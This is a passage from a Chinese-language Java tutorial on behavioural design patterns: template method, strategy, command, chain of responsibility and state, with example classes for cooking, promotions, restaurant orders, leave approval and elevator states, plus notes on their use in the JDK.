System.out.println(&quot;热油&quot;);    &#125;    //第三步：倒蔬菜是不一样的（一个下包菜，一个是下菜心）    public abstract void pourVegetable();    //第四步：倒调味料是不一样    public abstract void pourSauce();    //第五步：翻炒是一样的，所以直接实现    public void fry()&#123;        System.out.println(&quot;炒啊炒啊炒到熟啊&quot;);    &#125;&#125;public class ConcreteClass_BaoCai extends AbstractClass &#123;    @Override    public void pourVegetable() &#123;        System.out.println(&quot;下锅的蔬菜是包菜&quot;);    &#125;    @Override    public void pourSauce() &#123;        System.out.println(&quot;下锅的酱料是辣椒&quot;);    &#125;&#125;public class ConcreteClass_CaiXin extends AbstractClass &#123;    @Override    public void pourVegetable() &#123;        System.out.println(&quot;下锅的蔬菜是菜心&quot;);    &#125;    @Override    public void pourSauce() &#123;        System.out.println(&quot;下锅的酱料是蒜蓉&quot;);    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        //炒手撕包菜        ConcreteClass_BaoCai baoCai = new ConcreteClass_BaoCai();        baoCai.cookProcess();        //炒蒜蓉菜心        ConcreteClass_CaiXin caiXin = new ConcreteClass_CaiXin();        caiXin.cookProcess();    &#125;&#125;\n\n\n注意：为防止恶意操作，一般模板方法都加上 final 关键词。\n\n优缺点优点：\n\n提高代码复用性将相同部分的代码放在抽象的父类中，而将不同的代码放入不同的子类中。\n实现了反向控制通过一个父类调用其子类的操作，通过对子类的具体实现扩展不同的行为，实现了反向控制 ，并符合“开闭原则”。\n\n缺点：\n\n对每个不同的实现都需要定义一个子类，这会导致类的个数增加，系统更加庞大，设计也更加抽象。\n父类中的抽象方法由子类实现，子类执行的结果会影响父类的结果，这导致一种反向的控制结构，它提高了代码阅读的难度。\n\n适用场景\n算法的整体步骤很固定，但其中个别部分易变时，这时候可以使用模板方法模式，将容易变的部分抽象出来，供子类实现。\n需要通过子类来决定父类算法中某个步骤是否执行，实现子类对父类的反向控制。\n\nJDK中的应用（InputStream类）InputStream类就使用了模板方法模式。在InputStream类中定义了多个 read() 方法，如下：\npublic abstract class InputStream implements Closeable &#123;    //抽象方法，要求子类必须重写    public abstract int read() throws IOException;    public int read(byte b[]) throws IOException &#123;        return read(b, 0, b.length);    &#125;    public int read(byte b[], int off, int len) throws IOException &#123;        if (b == null) &#123;            throw new NullPointerException();        &#125; else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) &#123;            throw new IndexOutOfBoundsException();        &#125; else if (len == 0) &#123;            return 0;        &#125;        int c = read(); //调用了无参的read方法，该方法是每次读取一个字节数据        if (c == -1) &#123;            return -1;        &#125;        b[off] = (byte)c;        int i = 1;        try &#123;            for (; i &lt; len ; i++) &#123;                c = read();                if (c == -1) &#123;                    break;                &#125;                b[off + i] = (byte)c;            &#125;        &#125; catch (IOException ee) &#123;        &#125;        return i;    &#125;&#125;\n\n从上面代码可以看到，无参的 read() 方法是抽象方法，要求子类必须实现。而 read(byte b[]) 方法调用了 read(byte b[], int off, int len) 方法，所以在此处重点看的方法是带三个参数的方法。在该方法中第18行、27行，可以看到调用了无参的抽象的 read() 方法。总结如下： 在InputStream父类中已经定义好了读取一个字节数组数据的方法是每次读取一个字节，并将其存储到数组的第一个索引位置，读取len个字节数据。具体如何读取一个字节数据呢？由子类实现。\n策略模式概述先看下面的图片，我们去旅游选择出行模式有很多种，可以骑自行车、可以坐汽车、可以坐火车、可以坐飞机。\n\n作为一个程序猿，开发需要选择一款开发工具，当然可以进行代码开发的工具有很多，可以选择Idea进行开发，也可以使用eclipse进行开发，也可以使用其他的一些开发工具。\n\n定义：该模式定义了一系列算法，并将每个算法封装起来，使它们可以相互替换，且算法的变化不会影响使用算法的客户。策略模式属于对象行为模式，它通过对算法进行封装，把使用算法的责任和算法的实现分割开来，并委派给不同的对象对这些算法进行管理。\n结构策略模式的主要角色如下：\n\n抽象策略（Strategy）类：这是一个抽象角色，通常由一个接口或抽象类实现。此角色给出所有的具体策略类所需的接口。\n具体策略（Concrete Strategy）类：实现了抽象策略定义的接口，提供具体的算法实现或行为。\n环境（Context）类：持有一个策略类的引用，最终给客户端调用。\n\n案例实现例：促销活动一家百货公司在定年度的促销活动。针对不同的节日（春节、中秋节、圣诞节）推出不同的促销活动，由促销员将促销活动展示给客户。类图如下：\n\n代码如下：定义百货公司所有促销活动的共同接口\npublic interface Strategy &#123;    void show();&#125;\n\n定义具体策略角色（Concrete Strategy）：每个节日具体的促销活动\n//为春节准备的促销活动Apublic class StrategyA implements Strategy &#123;    public void show() &#123;        System.out.println(&quot;买一送一&quot;);    &#125;&#125;//为中秋准备的促销活动Bpublic class StrategyB implements Strategy &#123;    public void show() &#123;        System.out.println(&quot;满200元减50元&quot;);    &#125;&#125;//为圣诞准备的促销活动Cpublic class StrategyC implements Strategy &#123;    public void show() &#123;        System.out.println(&quot;满1000元加一元换购任意200元以下商品&quot;);    &#125;&#125;\n\n定义环境角色（Context）：用于连接上下文，即把促销活动推销给客户，这里可以理解为销售员\npublic class SalesMan &#123;                            //持有抽象策略角色的引用                                  private Strategy strategy;                                                                    public SalesMan(Strategy strategy) &#123;               this.strategy = strategy;                  &#125;                                                                                             //向客户展示促销活动                                    public void salesManShow()&#123;                        strategy.show();                           &#125;                                          &#125;                                              \n\n测试类：\npublic class Client &#123;    public static void main(String[] args) &#123;        SalesMan salesMan = new SalesMan(new StrategyA());        salesMan.salesManShow();        salesMan.setStrategy(new StrategyB());        salesMan.salesManShow();    &#125;&#125;\n\n优缺点\n优点：\n策略类之间可以自由切换由于策略类都实现同一个接口，所以使它们之间可以自由切换。\n易于扩展增加一个新的策略只需要添加一个具体的策略类即可，基本不需要改变原有的代码，符合“开闭原则“\n避免使用多重条件选择语句（if else），充分体现面向对象设计思想。\n\n\n缺点：\n客户端必须知道所有的策略类，并自行决定使用哪一个策略类。\n策略模式将造成产生很多策略类，可以通过使用享元模式在一定程度上减少对象的数量。\n\n\n\n使用场景\n一个系统需要动态地在几种算法中选择一种时，可将每个算法封装到策略类中。\n一个类定义了多种行为，并且这些行为在这个类的操作中以多个条件语句的形式出现，可将每个条件分支移入它们各自的策略类中以代替这些条件语句。\n系统中各算法彼此完全独立，且要求对客户隐藏具体算法的实现细节时。\n系统要求使用算法的客户不应该知道其操作的数据时，可使用策略模式来隐藏与算法相关的数据结构。\n多个类只区别在表现行为不同，可以使用策略模式，在运行时动态选择具体要执行的行为。\n\nJDK中的应用（Comparator比较器）Comparator 中的策略模式。在Arrays类中有一个 sort() 方法，如下：\npublic class Arrays&#123;    public static &lt;T&gt; void sort(T[] a, Comparator&lt;? super T&gt; c) &#123;        if (c == null) &#123;            sort(a);        &#125; else &#123;            if (LegacyMergeSort.userRequested)                legacyMergeSort(a, c);            else                TimSort.sort(a, 0, a.length, c, null, 0, 0);        &#125;    &#125;&#125;\n\nArrays就是一个环境角色类，这个sort方法可以传一个新策略让Arrays根据这个策略来进行排序。就比如下面的测试类。\npublic class Client &#123;    public static void main(String[] args) &#123;        Integer[] data = &#123;12, 2, 3, 2, 4, 5, 1&#125;;        // 实现降序排序        Arrays.sort(data, new Comparator&lt;Integer&gt;() &#123;            public int compare(Integer o1, Integer o2) &#123;                return o2 - o1;            &#125;        &#125;);        System.out.println(Arrays.toString(data)); //[12, 5, 4, 3, 2, 2, 1]    &#125;&#125;\n\n这里在调用Arrays的sort方法时，第二个参数传递的是Comparator接口的子实现类对象。所以Comparator充当的是抽象策略角色，而具体的子实现类充当的是具体策略角色。环境角色类（Arrays）应该持有抽象策略的引用来调用。那么，Arrays类的sort方法到底有没有使用Comparator子实现类中的 compare() 方法？查看TimSort类的 sort() 方法，代码如下：\nclass TimSort&lt;T&gt; &#123;    static &lt;T&gt; void sort(T[] a, int lo, int hi, Comparator&lt;? super T&gt; c,                         T[] work, int workBase, int workLen) &#123;        assert c != null &amp;&amp; a != null &amp;&amp; lo &gt;= 0 &amp;&amp; lo &lt;= hi &amp;&amp; hi &lt;= a.length;        int nRemaining  = hi - lo;        if (nRemaining &lt; 2)            return;  // Arrays of size 0 and 1 are always sorted        // If array is small, do a &quot;mini-TimSort&quot; with no merges        if (nRemaining &lt; MIN_MERGE) &#123;            int initRunLen = countRunAndMakeAscending(a, lo, hi, c);            binarySort(a, lo, hi, lo + initRunLen, c);            return;        &#125;        ...    &#125;               private static &lt;T&gt; int countRunAndMakeAscending(T[] a, int lo, int hi,Comparator&lt;? super T&gt; c) &#123;        assert lo &lt; hi;        int runHi = lo + 1;        if (runHi == hi)            return 1;        // Find end of run, and reverse range if descending        if (c.compare(a[runHi++], a[lo]) &lt; 0) &#123; // Descending            while (runHi &lt; hi &amp;&amp; c.compare(a[runHi], a[runHi - 1]) &lt; 0)                runHi++;            reverseRange(a, lo, runHi);        &#125; else &#123;                              // Ascending            while (runHi &lt; hi &amp;&amp; c.compare(a[runHi], a[runHi - 1]) &gt;= 0)                runHi++;        &#125;        return runHi - lo;    &#125;&#125;\n\n上面的代码中最终会跑到 countRunAndMakeAscending() 这个方法中。可以看见，只用了compare方法，所以在调用Arrays.sort方法只传具体compare重写方法的类对象就行，这也是Comparator接口中必须要子类实现的一个方法。\n命令模式概述日常生活中，出去吃饭都会遇到下面的场景。\n\n定义：将一个请求封装为一个对象，使发出请求的责任和执行请求的责任分割开。这样两者之间通过命令对象进行沟通，这样方便将命令对象进行存储、传递、调用、增加与管理。\n结构命令模式包含以下主要角色：\n\n抽象命令类（Command）角色： 定义命令的接口，声明执行的方法。\n具体命令（Concrete  Command）角色：具体的命令，实现命令接口；通常会持有接收者，并调用接收者的功能来完成命令要执行的操作。\n实现者&#x2F;接收者（Receiver）角色： 接收者，真正执行命令的对象。任何类都可能成为一个接收者，只要它能够实现命令要求实现的相应功能。\n调用者&#x2F;请求者（Invoker）角色： 要求命令对象执行请求，通常会持有命令对象，可以持有很多的命令对象。这个是客户端真正触发命令并要求命令执行相应操作的地方，也就是说相当于使用命令对象的入口。\n\n案例实现将上面的案例用代码实现，那就需要分析命令模式的角色在该案例中由谁来充当。\n服务员： 就是调用者角色，由她来发起命令。资深大厨： 就是接收者角色，真正命令执行的对象。订单： 命令中包含订单。\n类图如下：\n\n代码如下：\npublic interface Command &#123;    void execute();//只需要定义一个统一的执行方法&#125;public class OrderCommand implements Command &#123;    //持有接受者对象    private SeniorChef receiver;    private Order order;    public OrderCommand(SeniorChef receiver, Order order)&#123;        this.receiver = receiver;        this.order = order;    &#125;    public void execute()  &#123;        System.out.println(order.getDiningTable() + &quot;桌的订单：&quot;);        Set&lt;String&gt; keys = order.getFoodDic().keySet();        for (String key : keys) &#123;            receiver.makeFood(order.getFoodDic().get(key),key);        &#125;        try &#123;            Thread.sleep(100);//停顿一下 模拟做饭的过程        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;                System.out.println(order.getDiningTable() + &quot;桌的饭弄好了&quot;);    &#125;&#125;public class Order &#123;    // 餐桌号码    private int diningTable;    // 用来存储餐名并记录份数    private Map&lt;String, Integer&gt; foodDic = new HashMap&lt;String, Integer&gt;();    public int getDiningTable() &#123;        return diningTable;    &#125;    public void setDiningTable(int diningTable) &#123;        this.diningTable = diningTable;    &#125;    public Map&lt;String, Integer&gt; getFoodDic() &#123;        return foodDic;    &#125;    public void setFoodDic(String name, int num) &#123;        foodDic.put(name,num);    &#125;&#125;// 资深大厨类 是命令的Receiverpublic class SeniorChef &#123;    public void makeFood(int num,String foodName) &#123;        System.out.println(num + &quot;份&quot; + foodName);    &#125;&#125;public class Waitor &#123;    private ArrayList&lt;Command&gt; commands;//可以持有很多的命令对象    public Waitor() &#123;        commands = new ArrayList();    &#125;        public void setCommand(Command cmd)&#123;        commands.add(cmd);    &#125;    // 发出命令 喊 订单来了，厨师开始执行    public void orderUp() &#123;        System.out.println(&quot;美女服务员：叮咚，大厨，新订单来了.......&quot;);        for (int i = 0; i &lt; commands.size(); i++) &#123;            Command cmd = commands.get(i);            if (cmd != null) &#123;                cmd.execute();            &#125;        &#125;    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        //创建2个order        Order order1 = new Order();        order1.setDiningTable(1);        order1.getFoodDic().put(&quot;西红柿鸡蛋面&quot;,1);        order1.getFoodDic().put(&quot;小杯可乐&quot;,2);        Order order2 = new Order();        order2.setDiningTable(3);        order2.getFoodDic().put(&quot;尖椒肉丝盖饭&quot;,1);        order2.getFoodDic().put(&quot;小杯雪碧&quot;,1);        //创建接收者        SeniorChef receiver=new SeniorChef();        //将订单和接收者封装成命令对象        OrderCommand cmd1 = new OrderCommand(receiver, order1);        OrderCommand cmd2 = new OrderCommand(receiver, order2);        //创建调用者 waitor        Waitor invoker = new Waitor();        invoker.setCommand(cmd1);        invoker.setCommand(cmd2);        //将订单带到柜台 并向厨师喊 订单来了        invoker.orderUp();    &#125;&#125;\n\n优缺点\n优点：\n\n降低系统的耦合度。命令模式能将调用操作的对象与实现该操作的对象解耦。\n增加或删除命令非常方便。采用命令模式增加与删除命令不会影响其他类，它满足“开闭原则”，对扩展比较灵活。\n可以实现宏命令。命令模式可以与组合模式结合，将多个命令装配成一个组合命令，即宏命令。\n方便实现 Undo 和 Redo 操作。命令模式可以与后面介绍的备忘录模式结合，实现命令的撤销与恢复。\n\n\n缺点：\n\n使用命令模式可能会导致某些系统有过多的具体命令类。\n系统结构更加复杂。\n\n\n\n使用场景\n系统需要将请求调用者和请求接收者解耦，使得调用者和接收者不直接交互。\n系统需要在不同的时间指定请求、将请求排队和执行请求。\n系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作。\n\nJDK中的应用（Runable类）Runable是一个典型命令模式，Runnable担当命令的角色，Thread充当的是调用者，start方法就是其执行方法\n//命令接口(抽象命令角色)public interface Runnable &#123;\tpublic abstract void run();&#125;//调用者public class Thread implements Runnable &#123;    private Runnable target;        public synchronized void start() &#123;        if (threadStatus != 0)            throw new IllegalThreadStateException();        group.add(this);        boolean started = false;        try &#123;            start0();            started = true;        &#125; finally &#123;            try &#123;                if (!started) &#123;                    group.threadStartFailed(this);                &#125;            &#125; catch (Throwable ignore) &#123;            &#125;        &#125;    &#125;        private native void start0();&#125;\n\n会调用一个native方法start0(),调用系统方法，开启一个线程。而接收者是对程序员开放的，可以自己定义接收者。\n/** * jdk Runnable 命令模式 *\t\tTurnOffThread ： 属于具体命令角色 */public class TurnOffThread implements Runnable&#123;     private Receiver receiver;         public TurnOffThread(Receiver receiver) &#123;     \tthis.receiver = receiver;     &#125;     public void run() &#123;     \treceiver.turnOFF();     &#125;&#125;\n\n/** * 测试类 */public class Client &#123;     public static void main(String[] args) &#123;         Receiver receiver = new Receiver();         TurnOffThread turnOffThread = new TurnOffThread(receiver);         Thread thread = new Thread(turnOffThread);         thread.start();     &#125;&#125;\n\n责任链模式概述在现实生活中，常常会出现这样的事例：一个请求有多个对象可以处理，但每个对象的处理条件或权限不同。例如，公司员工请假，可批假的领导有部门负责人、副总经理、总经理等，但每个领导能批准的天数不同，员工必须根据自己要请假的天数去找不同的领导签名，也就是说员工必须记住每个领导的姓名、电话和地址等信息，这增加了难度。这样的例子还有很多，如找领导出差报销、生活中的“击鼓传花”游戏等。\n定义：又名职责链模式，为了避免请求发送者与多个请求处理者耦合在一起，将所有请求的处理者通过前一对象记住其下一个对象的引用而连成一条链；当有请求发生时，可将请求沿着这条链传递，直到有对象处理它为止。\n结构职责链模式主要包含以下角色:\n\n抽象处理者（Handler）角色：定义一个处理请求的接口，包含抽象处理方法和一个后继连接。\n具体处理者（Concrete Handler）角色：实现抽象处理者的处理方法，判断能否处理本次请求，如果可以处理请求则处理，否则将该请求转给它的后继者。\n客户类（Client）角色：创建处理链，并向链头的具体处理者对象提交请求，它不关心处理细节和请求的传递过程。\n\n案例实现现需要开发一个请假流程控制系统。请假一天以下的假只需要小组长同意即可；请假1天到3天的假还需要部门经理同意；请求3天到7天还需要总经理同意才行。\n类图如下：\n\n代码如下：\n//请假条public class LeaveRequest &#123;    private String name;//姓名    private int num;//请假天数    private String content;//请假内容    public LeaveRequest(String name, int num, String content) &#123;        this.name = name;        this.num = num;        this.content = content;    &#125;    public String getName() &#123;        return name;    &#125;    public int getNum() &#123;        return num;    &#125;    public String getContent() &#123;        return content;    &#125;&#125;//处理者抽象类public abstract class Handler &#123;    protected final static int NUM_ONE = 1;    protected final static int NUM_THREE = 3;    protected final static int NUM_SEVEN = 7;    //该领导处理的请假天数区间    private int numStart;    private int numEnd;    //领导上面还有领导    private Handler nextHandler;    //设置请假天数范围 上不封顶    public Handler(int numStart) &#123;        this.numStart = numStart;    &#125;    //设置请假天数范围    public Handler(int numStart, int numEnd) &#123;        this.numStart = numStart;        this.numEnd = numEnd;    &#125;    //设置上级领导    public void setNextHandler(Handler nextHandler)&#123;        this.nextHandler = nextHandler;    &#125;    //提交请假条    public final void submit(LeaveRequest leave)&#123;        if(0 == this.numStart)&#123;            return;        &#125;        //如果请假天数达到该领导者的处理要求        if(leave.getNum() &gt;= this.numStart)&#123;            this.handleLeave(leave);            //如果还有上级 并且请假天数超过了当前领导的处理范围            if(null != this.nextHandler &amp;&amp; leave.getNum() &gt; numEnd)&#123;                this.nextHandler.submit(leave);//继续提交            &#125; else &#123;                System.out.println(&quot;流程结束&quot;);            &#125;        &#125;    &#125;    //各级领导处理请假条方法    protected abstract void handleLeave(LeaveRequest leave);&#125;//小组长public class GroupLeader extends Handler &#123;    public GroupLeader() &#123;        //小组长处理1-3天的请假        super(Handler.NUM_ONE, Handler.NUM_THREE);    &#125;    @Override    protected void handleLeave(LeaveRequest leave) &#123;        System.out.println(leave.getName() + &quot;请假&quot; + leave.getNum() + &quot;天,&quot; + leave.getContent() + &quot;。&quot;);        System.out.println(&quot;小组长审批：同意。&quot;);    &#125;&#125;//部门经理public class Manager extends Handler &#123;    public Manager() &#123;        //部门经理处理3-7天的请假        super(Handler.NUM_THREE, Handler.NUM_SEVEN);    &#125;    @Override    protected void handleLeave(LeaveRequest leave) &#123;        System.out.println(leave.getName() + &quot;请假&quot; + leave.getNum() + &quot;天,&quot; + leave.getContent() + &quot;。&quot;);        System.out.println(&quot;部门经理审批：同意。&quot;);    &#125;&#125;//总经理public class GeneralManager extends Handler &#123;    public GeneralManager() &#123;        //部门经理处理7天以上的请假        super(Handler.NUM_SEVEN);    &#125;    @Override    protected void handleLeave(LeaveRequest leave) &#123;        System.out.println(leave.getName() + &quot;请假&quot; + leave.getNum() + &quot;天,&quot; + leave.getContent() + &quot;。&quot;);        System.out.println(&quot;总经理审批：同意。&quot;);    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        //请假条来一张        LeaveRequest leave = new LeaveRequest(&quot;小花&quot;,5,&quot;身体不适&quot;);        //各位领导        GroupLeader groupLeader = new GroupLeader();        Manager manager = new Manager();        GeneralManager generalManager = new GeneralManager();        groupLeader.setNextHandler(manager);//小组长的领导是部门经理        manager.setNextHandler(generalManager);//部门经理的领导是总经理        //之所以在这里设置上级领导，是因为可以根据实际需求来更改设置，如果实战中上级领导人都是固定的，则可以移到领导实现类中。        //提交申请        groupLeader.submit(leave);    &#125;&#125;\n\n优缺点\n优点：\n\n降低了对象之间的耦合度该模式降低了请求发送者和接收者的耦合度。\n增强了系统的可扩展性可以根据需要增加新的请求处理类，满足开闭原则。\n增强了给对象指派职责的灵活性当工作流程发生变化，可以动态地改变链内的成员或者修改它们的次序，也可动态地新增或者删除责任。\n责任链简化了对象之间的连接一个对象只需保持一个指向其后继者的引用，不需保持其他所有处理者的引用，这避免了使用众多的 if 或者 if···else 语句。\n责任分担每个类只需要处理自己该处理的工作，不能处理的传递给下一个对象完成，明确各类的责任范围，符合类的单一职责原则。\n\n\n缺点：\n\n不能保证每个请求一定被处理。由于一个请求没有明确的接收者，所以不能保证它一定会被处理，该请求可能一直传到链的末端都得不到处理。\n对比较长的职责链，请求的处理可能涉及多个处理对象，系统性能将受到一定影响。\n职责链建立的合理性要靠客户端来保证，增加了客户端的复杂性，可能会由于职责链的错误设置而导致系统出错，如可能会造成循环调用。\n\n\n\nJavaWeb中的应用（FilterChain）在javaWeb应用开发中，FilterChain是职责链（过滤器）模式的典型应用，以下是Filter的模拟实现分析:\n模拟web请求Request以及web响应Response\npublic interface Request&#123;&#125;public interface Response&#123;&#125;\n\n模拟web过滤器Filter\npublic interface Filter &#123;    public void doFilter(Request req,Response res,FilterChain c);&#125;\n\n模拟实现具体过滤器\npublic class FirstFilter implements Filter &#123;   @Override   public void doFilter(Request request, Response response, FilterChain chain) &#123;       System.out.println(&quot;过滤器1 前置处理&quot;);       // 先执行所有request再倒序执行所有response       chain.doFilter(request, response);       System.out.println(&quot;过滤器1 后置处理&quot;);   &#125;&#125;public class SecondFilter  implements Filter &#123;   @Override   public void doFilter(Request request, Response response, FilterChain chain) &#123;       System.out.println(&quot;过滤器2 前置处理&quot;);          // 先执行所有request再倒序执行所有response       chain.doFilter(request, response);          System.out.println(&quot;过滤器2 后置处理&quot;);   &#125;&#125;\n\n模拟实现过滤器链FilterChain\npublic class FilterChain &#123;      private List&lt;Filter&gt; filters = new ArrayList&lt;Filter&gt;();      private int index = 0;      // 链式调用   public FilterChain addFilter(Filter filter) &#123;       this.filters.add(filter);       return this;   &#125;      public void doFilter(Request request, Response response) &#123;       if (index == filters.size()) &#123;           return;       &#125;       Filter filter = filters.get(index);       index++;       filter.doFilter(request, response, this);   &#125;&#125;\n\n测试类\npublic class Client &#123;   public static void main(String[] args) &#123;       Request  req = null;       Response res = null;       FilterChain filterChain = new FilterChain();       filterChain.addFilter(new FirstFilter()).addFilter(new SecondFilter());       filterChain.doFilter(req,res);   &#125;&#125;\n\n状态模式概述例：通过按钮来控制一个电梯的状态，一个电梯有开门状态，关门状态，停止状态，运行状态。每一种状态改变，都有可能要根据其他状态来更新处理。例如，如果电梯门现在处于运行时状态，就不能进行开门操作，而如果电梯门是停止状态，就可以执行开门操作。\n类图如下：\n\n代码如下：\npublic interface ILift &#123;    //电梯的4个状态    //开门状态    public final static int OPENING_STATE = 1;    //关门状态    public final static int CLOSING_STATE = 2;    //运行状态    public final static int RUNNING_STATE = 3;    //停止状态    public final static int STOPPING_STATE = 4;    //设置电梯的状态    public void setState(int state);    //电梯的动作    public void open();    public void close();    public void run();    public void stop();&#125;public class Lift implements ILift &#123;    private int state;    @Override    public void setState(int state) &#123;        this.state = state;    &#125;    //执行关门动作    @Override    public void close() &#123;        switch (this.state) &#123;            case OPENING_STATE:                System.out.println(&quot;电梯关门了。。。&quot;);//只有开门状态可以关闭电梯门，可以对应电梯状态表来看                this.setState(CLOSING_STATE);//关门之后电梯就是关闭状态了                break;            case CLOSING_STATE:                //do nothing //已经是关门状态，不能关门                break;            case RUNNING_STATE:                //do nothing //运行时电梯门是关着的，不能关门                break;            case STOPPING_STATE:                //do nothing //停止时电梯也是关着的，不能关门                break;        &#125;    &#125;    //执行开门动作    @Override    public void open() &#123;        switch (this.state) &#123;            case OPENING_STATE://门已经开了，不能再开门了                //do nothing                break;            case CLOSING_STATE://关门状态，门打开:                System.out.println(&quot;电梯门打开了。。。&quot;);                this.setState(OPENING_STATE);                break;            case RUNNING_STATE:                //do nothing 运行时电梯不能开门                break;            case STOPPING_STATE:                System.out.println(&quot;电梯门开了。。。&quot;);//电梯停了，可以开门了                this.setState(OPENING_STATE);                break;        &#125;    &#125;    //执行运行动作    @Override    public void run() &#123;        switch (this.state) &#123;            case OPENING_STATE://电梯不能开着门就走                //do nothing                break;            case CLOSING_STATE://门关了，可以运行了                System.out.println(&quot;电梯开始运行了。。。&quot;);                this.setState(RUNNING_STATE);//现在是运行状态                break;            case RUNNING_STATE:                //do nothing 已经是运行状态了                break;            case STOPPING_STATE:                System.out.println(&quot;电梯开始运行了。。。&quot;);                this.setState(RUNNING_STATE);                break;        &#125;    &#125;    //执行停止动作    @Override    public void stop() &#123;        switch (this.state) &#123;            case OPENING_STATE: //开门的电梯已经是是停止的了(正常情况下)                //do nothing                break;            case CLOSING_STATE://关门时才可以停止                System.out.println(&quot;电梯停止了。。。&quot;);                this.setState(STOPPING_STATE);                break;            case RUNNING_STATE://运行时当然可以停止了                System.out.println(&quot;电梯停止了。。。&quot;);                this.setState(STOPPING_STATE);                break;            case STOPPING_STATE:                //do nothing                break;        &#125;    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        Lift lift = new Lift();        lift.setState(ILift.STOPPING_STATE);//电梯是停止的        lift.open();//开门        lift.close();//关门        lift.run();//运行        lift.stop();//停止    &#125;&#125;\n\n问题分析：\n\n使用了大量的switch…case这样的判断（if…else也是一样)，使程序的可阅读性变差。\n扩展性很差。如果新加了断电的状态，需要修改上面判断逻辑\n\n定义：对有状态的对象，把复杂的“判断逻辑”提取到不同的状态对象中，允许状态对象在其内部状态发生改变时改变其行为。\n结构状态模式包含以下主要角色。\n\n环境（Context）角色：也称为上下文，它定义了客户程序需要的接口，维护一个当前状态，并将与状态相关的操作委托给当前状态对象来处理。\n抽象状态（State）角色：定义一个接口，用以封装环境对象中的特定状态所对应的行为。\n具体状态（Concrete  State）角色：实现抽象状态所对应的行为。\n\n案例实现对上述电梯的案例使用状态模式进行改进。类图如下：\n\n代码如下：\n//抽象状态类public abstract class LiftState &#123;    //定义一个环境角色，也就是封装状态的变化引起的功能变化    protected Context context;    public void setContext(Context context) &#123;        this.context = context;    &#125;    //电梯开门动作    public abstract void open();    //电梯关门动作    public abstract void close();    //电梯运行动作    public abstract void run();    //电梯停止动作    public abstract void stop();&#125;//开启状态public class OpenningState extends LiftState &#123;    //开启当然可以关闭了，我就想测试一下电梯门开关功能    @Override    public void open() &#123;        System.out.println(&quot;电梯门开启...&quot;);    &#125;    @Override    public void close() &#123;        //状态修改        super.context.setLiftState(Context.closingState);        //动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作        super.context.getLiftState().close();    &#125;    //电梯门不能开着就跑，这里什么也不做    @Override    public void run() &#123;        //do nothing    &#125;    //开门状态已经是停止的了    @Override    public void stop() &#123;        //do nothing    &#125;&#125;//运行状态public class RunningState extends LiftState &#123;    //运行的时候开电梯门？你疯了！电梯不会给你开的    @Override    public void open() &#123;        //do nothing    &#125;    //电梯门关闭？这是肯定了    @Override    public void close() &#123;//虽然可以关门，但这个动作不归我执行        //do nothing    &#125;    //这是在运行状态下要实现的方法    @Override    public void run() &#123;        System.out.println(&quot;电梯正在运行...&quot;);    &#125;    //这个事绝对是合理的，光运行不停止还有谁敢做这个电梯？！估计只有上帝了    @Override    public void stop() &#123;        super.context.setLiftState(Context.stoppingState);        super.context.stop();    &#125;&#125;//停止状态public class StoppingState extends LiftState &#123;    //停止状态，开门，那是要的！    @Override    public void open() &#123;        //状态修改        super.context.setLiftState(Context.openningState);        //动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作        super.context.getLiftState().open();    &#125;    @Override    public void close() &#123;//虽然可以关门，但这个动作不归我执行        //状态修改        super.context.setLiftState(Context.closingState);        //动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作        super.context.getLiftState().close();    &#125;    //停止状态再跑起来，正常的很    @Override    public void run() &#123;        //状态修改        super.context.setLiftState(Context.runningState);        //动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作        super.context.getLiftState().run();    &#125;    //停止状态是怎么发生的呢？当然是停止方法执行了    @Override    public void stop() &#123;        System.out.println(&quot;电梯停止了...&quot;);    &#125;&#125;//关闭状态public class ClosingState extends LiftState &#123;    @Override    //电梯门关闭，这是关闭状态要实现的动作    public void close() &#123;        System.out.println(&quot;电梯门关闭...&quot;);    &#125;    //电梯门关了再打开，逗你玩呢，那这个允许呀    @Override    public void open() &#123;        super.context.setLiftState(Context.openningState);        super.context.open();    &#125;    //电梯门关了就跑，这是再正常不过了    @Override    public void run() &#123;        super.context.setLiftState(Context.runningState);        super.context.run();    &#125;    //电梯门关着，我就不按楼层    @Override    public void stop() &#123;        super.context.setLiftState(Context.stoppingState);        super.context.stop();    &#125;&#125;//环境角色public class Context &#123;    //定义出所有的电梯状态    public final static OpenningState openningState = new OpenningState();//开门状态，这时候电梯只能关闭    public final static ClosingState closingState = new ClosingState();//关闭状态，这时候电梯可以运行、停止和开门    public final static RunningState runningState = new RunningState();//运行状态，这时候电梯只能停止    public final static StoppingState stoppingState = new StoppingState();//停止状态，这时候电梯可以开门、运行    //定义一个当前电梯状态    private LiftState liftState;    public LiftState getLiftState() &#123;        return this.liftState;    &#125;    public void setLiftState(LiftState liftState) &#123;        //当前环境改变        this.liftState = liftState;        //把当前的环境通知到各个实现类中        this.liftState.setContext(this);    &#125;    public void open() &#123;        this.liftState.open();    &#125;    public void close() &#123;        this.liftState.close();    &#125;    public void run() &#123;        this.liftState.run();    &#125;    public void stop() &#123;        this.liftState.stop();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        Context context = new Context();        context.setLiftState(new ClosingState());        context.open();        context.close();        context.run();        context.stop();    